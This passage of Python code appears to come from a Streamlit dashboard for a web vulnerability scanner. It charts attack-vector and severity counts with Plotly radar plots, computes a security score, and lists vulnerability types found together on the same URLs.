                    values = list(attack_vectors.values())
                    
                    # Create radar chart
                    fig = go.Figure()
                    
                    fig.add_trace(go.Scatterpolar(
                        r=values,
                        theta=categories,
                        fill='toself',
                        name='Attack Vectors',
                        line=dict(color='#ff6b6b', width=3),
                        fillcolor='rgba(255, 107, 107, 0.2)',
                        marker=dict(size=10, color='#ff6b6b')
                    ))
                    
                    fig.update_layout(
                        polar=dict(
                            radialaxis=dict(
                                visible=True,
                                range=[0, max(values) + 1] if values else [0, 5],
                                gridcolor='lightgray',
                                gridwidth=1,
                            ),
                            angularaxis=dict(
                                gridcolor='lightgray',
                                gridwidth=1,
                            )
                        ),
                        title={
                            'text': "Attack Vector Distribution",
                            'x': 0.5,
                            'xanchor': 'center',
                            'font': {'size': 16}
                        },
                        showlegend=True,
                        height=400,
                        margin=dict(l=50, r=50, t=80, b=50)
                    )
                    
                    st.plotly_chart(fig, use_container_width=True)
                else:
                    raise ImportError("Plotly not available")
                    
            except (ImportError, Exception):
                # Fallback display
                st.write("**Attack Vector Distribution:**")
                for vector, count in sorted(attack_vectors.items(), key=lambda x: x[1], reverse=True):
                    percentage = (count / len(vulnerabilities)) * 100
                    st.write(f"• **{vector}**: {count} ({percentage:.1f}%)")
    
    with col2:
        st.write("#### 📊 Security Risk Metrics (Radar Chart)")
        
        # Calculate security metrics for radar chart
        total_vulns = len(vulnerabilities)
        critical_count = len([v for v in vulnerabilities if v.get('severity') == 'CRITICAL'])
        high_count = len([v for v in vulnerabilities if v.get('severity') == 'HIGH'])
        medium_count = len([v for v in vulnerabilities if v.get('severity') == 'MEDIUM'])
        low_count = len([v for v in vulnerabilities if v.get('severity') == 'LOW'])
        
        # Create risk metrics radar chart
        try:
            if PLOTLY_AVAILABLE:
                # Risk metrics for radar visualization
                risk_categories = ['Critical Risk', 'High Risk', 'Medium Risk', 'Low Risk', 'Overall Coverage']
                
                # Normalize values for better visualization (scale 0-10)
                max_severity_count = max([critical_count, high_count, medium_count, low_count]) if total_vulns > 0 else 1
                risk_values = [
                    (critical_count / max_severity_count * 10) if max_severity_count > 0 else 0,
                    (high_count / max_severity_count * 10) if max_severity_count > 0 else 0,
                    (medium_count / max_severity_count * 10) if max_severity_count > 0 else 0,
                    (low_count / max_severity_count * 10) if max_severity_count > 0 else 0,
                    (total_vulns / 50 * 10) if total_vulns <= 50 else 10  # Scale overall coverage
                ]
                
                # Create risk metrics radar chart
                fig = go.Figure()
                
                fig.add_trace(go.Scatterpolar(
                    r=risk_values,
                    theta=risk_categories,
                    fill='toself',
                    name='Risk Profile',
                    line=dict(color='#4ecdc4', width=3),
                    fillcolor='rgba(78, 205, 196, 0.2)',
                    marker=dict(
                        size=10,
                        color=['#d32f2f', '#f57c00', '#f9a825', '#388e3c', '#1976d2']
                    )
                ))
                
                fig.update_layout(
                    polar=dict(
                        radialaxis=dict(
                            visible=True,
                            range=[0, 10],
                            gridcolor='lightgray',
                            gridwidth=1,
                            tick0=0,
                            dtick=2
                        ),
                        angularaxis=dict(
                            gridcolor='lightgray',
                            gridwidth=1,
                        )
                    ),
                    title={
                        'text': "Security Risk Profile",
                        'x': 0.5,
                        'xanchor': 'center',
                        'font': {'size': 16}
                    },
                    showlegend=True,
                    height=400,
                    margin=dict(l=50, r=50, t=80, b=50)
                )
                
                st.plotly_chart(fig, use_container_width=True)
            else:
                raise ImportError("Plotly not available")
                
        except (ImportError, Exception):
            # Fallback metrics display
            st.metric("🚨 Critical Issues", critical_count)
            st.metric("⚠️ High Priority Issues", high_count) 
            st.metric("🟡 Medium Issues", medium_count)
            st.metric("🟢 Low Issues", low_count)
    
    # Security posture summary
    st.write("#### 🛡️ Overall Security Assessment")
    
    # Calculate security score
    total_risk = sum([
        25 if v.get('severity') == 'CRITICAL' else
        15 if v.get('severity') == 'HIGH' else
        8 if v.get('severity') == 'MEDIUM' else
        3 if v.get('severity') == 'LOW' else 1
        for v in vulnerabilities
    ])
    
    max_possible_risk = total_vulns * 25 if total_vulns > 0 else 1
    security_score = max(0, 100 - (total_risk / max_possible_risk * 100))
    
    col1, col2, col3 = st.columns(3)
    
    with col1:
        st.metric("🛡️ Security Score", f"{security_score:.1f}%")
    with col2:
        st.metric("� Total Risk Points", total_risk)
    with col3:
        st.metric("🎯 Vulnerabilities Found", total_vulns)
    
    # Overall security assessment
    if security_score >= 80:
        st.success("✅ **GOOD SECURITY POSTURE** - Well protected with minimal vulnerabilities")
    elif security_score >= 60:
        st.warning("⚠️ **MODERATE SECURITY POSTURE** - Some improvements needed")
    else:
        st.error("🚨 **POOR SECURITY POSTURE** - Immediate action required")
    
    # Vulnerability correlation analysis
    st.write("#### 🔗 Vulnerability Correlation Analysis")
    
    type_combinations = {}
    url_vulns = {}
    
    # Group vulnerabilities by URL
    for vuln in vulnerabilities:
        url = vuln.get('url', 'Unknown')
        if url not in url_vulns:
            url_vulns[url] = []
        url_vulns[url].append(vuln.get('type', 'Unknown'))
    
    # Find combinations
    for url, types in url_vulns.items():
        unique_types = list(set(types))
        for i in range(len(unique_types)):
            for j in range(i + 1, len(unique_types)):
                combo = tuple(sorted([unique_types[i], unique_types[j]]))
                type_combinations[combo] = type_combinations.get(combo, 0) + 1
    
    if type_combinations:
        st.write("**Most Common Vulnerability Combinations:**")
        sorted_combos = sorted(type_combinations.items(), key=lambda x: x[1], reverse=True)
        for (type1, type2), count in sorted_combos[:5]:
            st.write(f"• **{type1}** + **{type2}**: Found together on {count} URLs")
    else:
        st.info("No significant vulnerability correlations found.")


if __name__ == "__main__":
    main()
